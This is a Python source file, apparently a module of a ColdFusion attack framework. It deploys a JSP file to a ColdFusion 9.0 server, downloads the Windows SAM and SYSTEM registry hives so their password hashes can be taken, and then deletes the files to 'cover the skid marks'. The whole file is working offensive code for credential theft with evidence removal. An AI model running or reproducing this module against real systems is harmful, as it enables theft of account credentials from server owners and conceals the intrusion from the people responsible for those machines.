from src.platform.coldfusion.interfaces import CINTERFACES
from log import LOG
from auxiliary import Auxiliary
from os import getuid
from time import sleep
import deployer
import utility


class Auxiliary:

    def download_file(self, url, fname):
        local_filename = fname
        try:
            r = utility.requests_get(url, stream=True)
            with open(local_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
                        f.flush()
            return local_filename
        except Exception, e:
            utility.Msg("Error downloading the " + fname + " file: %s" % e, LOG.ERROR)

    def Cleanup(self, fingerengine, fingerprint, sam, sys):
        #Cover the skid marks on the server
        url = "http://{0}:{1}/CFIDE/getSAM.jsp?del={2}&del2={3}".format(
            fingerengine.options.ip, fingerprint.port, sam, sys)

        try:
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        if response.status_code == 200:
            utility.Msg("Files cleaned up from server.", LOG.SUCCESS)
        else:
            utility.Msg("We might not have cleaned the files up correctly", LOG.ERROR)

    def __init__(self):
        self.name = 'Obtain Sam and System Registry hives.'
        self.versions = ['9.0']
        self.show = True
        self.flag = 'cf-getSAM'

    def check(self, fingerprint):
        if fingerprint.title == CINTERFACES.CFM and \
           fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        if getuid() > 0:
            utility.Msg("Root prives required for this module.", LOG.ERROR)
            return

        fingerengine.options.deploy = "./src/lib/getSAM.jsp"
        deployer.run(fingerengine)

        url = "http://{0}:{1}/CFIDE/getSAM.jsp".format(
            fingerengine.options.ip, fingerprint.port)

        utility.Msg("Checking if successfully deployed and executed...")

        try:
            response = utility.requests_get(url)
        except Exception, e:
            utility.Msg("Failed to connect: %s" % e, LOG.ERROR)
            return

        if response.status_code == 401:
            utility.Msg("Host requires auth...")

        if response.status_code == 200:
            utility.Msg("Deploy worked. Getting the files...")
            filenames = response.text
            if len(filenames) != 0:
                samfile = filenames.split("<")[0]
                samfile = samfile.replace(" ", "")
                samfile = samfile.replace("\n", "")
                samfile = samfile.rstrip()
                systemf = filenames.split(">")[1]
                systemf = systemf.replace("\n", "")
                systemf = systemf.replace(" ", "")
                systemf = systemf.rstrip()

                utility.Msg("Data in response, snagging hashes.", LOG.SUCCESS)

                urlsam = "http://{0}:{1}/CFIDE/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, samfile)
                self.download_file(urlsam, "SAM")
                utility.Msg("Downloaded SAM into clustered directory.")

                urlsys = "http://{0}:{1}/CFIDE/{2}".format(
                                        fingerengine.options.ip, fingerprint.port, systemf)
                self.download_file(urlsys, "System")
                utility.Msg("Downloaded System into clusterd directory.")

                self.Cleanup(fingerengine, fingerprint, samfile, systemf)

        if response.status_code == 404:
            utility.Msg("Seems the module didn't deploy correctly...", LOG.ERROR)

        fingerengine.options.deploy = None